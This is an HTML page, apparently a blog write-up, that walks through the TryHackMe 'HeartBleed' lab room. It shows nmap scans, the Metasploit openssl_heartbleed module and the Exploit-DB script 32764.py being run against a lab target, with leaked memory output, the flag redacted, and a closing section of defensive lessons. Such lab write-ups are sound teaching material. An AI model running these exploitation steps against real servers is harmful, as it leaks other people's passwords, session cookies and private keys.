@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>HeartBleed | JackHacksStuff</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500&family=Syne:wght@400;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../css/style.css">
+</head>
+<body class="room-easy">
+
+<div class="rail">
+  <a class="rail-logo" href="../index.html">Jack<span>Hacks</span>Stuff</a>
+  <div class="rail-toc" id="railToc">
+    <div class="rail-line"></div>
+    <div class="rail-tick active" data-heading="overview"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="recon"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="exploit"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="flags"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="takeaways"></div>
+    <div class="rail-line"></div>
+  </div>
+  <div class="rail-bottom">Easy</div>
+</div>
+
+<main>
+  <nav>
+    <a href="../writeups.html" class="nav-back">← Write-ups</a>
+    <div class="nav-meta">
+      <span>TryHackMe</span>
+      <span class="nav-badge easy">Easy</span>
+    </div>
+  </nav>
+
+  <div class="wu-header">
+    <div class="wu-eyebrow">// TryHackMe · vulnerability exploitation · memory leak</div>
+    <h1 class="wu-title">HeartBleed</h1>
+    <div class="wu-meta-row">
+      <div class="wu-meta-item">
+        <span class="wu-meta-label">Date</span>
+        <span class="wu-meta-value">2026-08-12</span>
+      </div>
+      <div class="wu-meta-item">
+        <span class="wu-meta-label">Difficulty</span>
+        <span class="wu-meta-value accent easy">Easy</span>
+      </div>
+      <div class="wu-meta-item">
+        <span class="wu-meta-label">Flags</span>
+        <span class="wu-meta-value">1</span>
+      </div>
+      <div class="wu-meta-item">
+        <span class="wu-meta-label">Platform</span>
+        <span class="wu-meta-value">TryHackMe</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="tool-row">
+    <span class="tool-tag">nmap</span>
+    <span class="tool-tag">vulnerability scanning</span>
+    <span class="tool-tag">metasploit</span>
+    <span class="tool-tag">memory forensics</span>
+    <span class="tool-tag">CVE-2014-0160</span>
+  </div>
+
+  <div class="wu-body">
+
+    <h2 id="overview">// Overview</h2>
+    <p><strong>HeartBleed</strong> is a TryHackMe room that demonstrates the infamous OpenSSL vulnerability (CVE-2014-0160). The objective is to exploit a vulnerable HTTPS server and retrieve the flag from its memory. The room demonstrates how one programming error in a commonly used library can lead to sensitive data from server memory being exposed, such as passwords, session cookies, and private keys.</p>
+    <p><a href="https://tryhackme.com/room/heartbleed" target="_blank">View room on TryHackMe →</a></p>
+    <p><em>Flags and sensitive data have been redacted per TryHackMe's write-up policy.</em></p>
+
+    <h2 id="recon">// Reconnaissance</h2>
+
+    <h3>Port Scanning</h3>
+    <p>We start with a comprehensive <code>nmap</code> scan to identify open ports and services:</p>
+
+    <pre>$ nmap -sC -sV -p- &lt;target_ip&gt;</pre>
+
+    <p>Two ports catch our attention:</p>
+
+<pre>PORT      STATE SERVICE  VERSION
+22/tcp    open  ssh      OpenSSH 7.4
+443/tcp   open  ssl/http nginx 1.15.7</pre>
+
+    <p>The SSL certificate provides additional context:</p>
+
+    <pre>| ssl-cert: Subject: commonName=localhost/organizationName=TryHackMe/stateOrProvinceName=London/countryName=UK
+| Not valid before: 2019-02-16T10:41:14
+|_Not valid after:  2020-02-16T10:41:14</pre>
+
+    <h3>Vulnerability Detection</h3>
+    <p>The fact that the certificate dates 2019-2020 indicates that the server could be running an older, vulnerable version of OpenSSL. We can check this using by using Nmap's Heartbleed detection script:</p>
+
+    <pre>$ nmap -sV --script=ssl-heartbleed -p 443 &lt;target_ip&gt;
+
+| ssl-heartbleed: 
+|   VULNERABLE:
+|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library.
+|     State: VULNERABLE
+|     Risk factor: High
+|       OpenSSL versions 1.0.1 and 1.0.2-beta releases are affected.
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
+|       http://www.openssl.org/news/secadv_20140407.txt</pre>
+
+    <div class="takeaway" style="margin: 1.5rem 0;">
+      <strong>Pro tip:</strong> The <code>--script=ssl-heartbleed</code> flag is very useful for quickly verifying a vulnerability. It's always a good idea to check your results using multiple tools when you can.
+    </div>
+
+    <h2 id="exploit">// Exploitation</h2>
+
+    <h3>Metasploit Approach</h3>
+    <p>While there are standalone Python scripts available, Metasploit provides a clean, reliable interface for exploiting Heartbleed:</p>
+
+    <pre>$ msfconsole
+msf6 > use auxiliary/scanner/ssl/openssl_heartbleed
+msf6 > set RHOSTS &lt;target_ip&gt;
+msf6 > set RPORT 443
+msf6 > set VERBOSE true
+msf6 > run</pre>
+
+    <p>The <code>VERBOSE</code> setting is crucial, as it displays the leaked data in readable format:</p>
+
+    <pre>[*] 10.80.71.102:443 - Heartbeat response, 65535 bytes
+[+] 10.80.71.102:443 - Heartbeat response with leak, 65535 bytes
+[*] 10.80.71.102:443 - Printable info leaked:
+......user_name=hacker101&user_email=haxor@haxor.com&user_message=[FLAG_REDACTED]../..?.</pre>
+
+    <h3>What's Happening Here?</h3>
+    <p>The Heartbleed exploit works by sending a malformed heartbeat request to the server:</p>
+    <ol>
+      <li>The client sends a heartbeat payload claiming to be 65,535 bytes long</li>
+      <li>The vulnerable server allocates memory for this response</li>
+      <li>Due to a missing bounds check, the server copies <em>more data than it should</em> from memory</li>
+      <li>This leaks whatever data happens to be in memory at that moment</li>
+    </ol>
+
+    <p>The leaked memory that was leaked included HTTP POST data which seems to come from a contact form submission. The flag was placed in the <code>user_message</code> field.</p>
+
+    <h3>Alternative: Standalone Python Script</h3>
+    <p>In environments without Metasploit, the Exploit-DB script (<code>32764.py</code>) can be used as an alternative:</p>
+
+    <pre>$ searchsploit -m 32764.py
+$ python3 32764.py &lt;target_ip&gt;</pre>
+
+    <p>The script carries out the same memory leak attack and shows chunks of server memory, although a number of runs might be required since the leaked data is to some extent random.</p>
+
+    <h2 id="flags">// The Flag</h2>
+
+    <p>The flag was extracted directly from the memory leak:</p>
+
+    <div class="flag-box">
+      <span class="flag-label">Flag</span>
+      <span class="flag-value">flag{sSL...}</span>
+    </div>
+
+    <p>This was found in the HTTP POST data:</p>
+
+    <pre>user_name=hacker101&user_email=haxor@haxor.com&user_message=[FLAG_REDACTED]</pre>
+
+    <p>This shows that user-submitted data can be made accessible through memory leaks, even if the data was submitted at a different time.</p>
+
+    <h2 id="takeaways">// Key Takeaways</h2>
+
+    <div class="takeaway">
+      <strong>Always verify vulnerabilities before exploiting them.</strong> The Nmap script had confirmed that the vulnerability actually existed, which saved time and established the attack vector. This step is essential when carrying out responsible penetration testing.
+    </div>
+
+    <div class="takeaway">
+      <strong>Memory leaks are unpredictable.</strong> Different instances of the same exploit can produce different data. Therefore, run memory-leak exploits several times and carefully examine the output for any useful information.
+    </div>
+
+    <div class="takeaway">
+      <strong>Understand the underlying vulnerability.</strong> Heartbleed is possible due to the absence of a bounds check in OpenSSL's heartbeat implementation. Understanding the root cause helps in detecting other similar vulnerabilities and giving explanations to stakeholders.
+    </div>
+
+    <div class="takeaway">
+      <strong>Old software versions are dangerous.</strong> The server was using a version of OpenSSL that was prior to the Heartbleed patch in 2014. Regular patching and updating is essential for maintaining security.
+    </div>
+
+    <div class="takeaway">
+      <strong>Data in memory is vulnerable.</strong> Even if the data is encrypted in transit or at rest, it can still be accessed while in active memory. This is why Heartbleed was so dangerous; it had the potential to expose private keys, session cookies, and other sensitive data that should have been protected.
+    </div>
+
+  </div>
+
+  <div class="wu-footer">
+    <a href="dodge.html" class="footer-nav-link prev">
+      <span class="footer-nav-label">← Previous</span>
+      <span class="footer-nav-title">Dodge</span>
+    </a>
+    <div class="footer-center">
+      <a href="../writeups.html">All write-ups</a>
+    </div>
+    <a href="lofi.html" class="footer-nav-link next">
+      <span class="footer-nav-label">Next →</span>
+      <span class="footer-nav-title">Lo-Fi</span>
+    </a>
+  </div>
+
+</main>
+
+<script src="../js/script.js"></script>
+
+</body>
+</html>
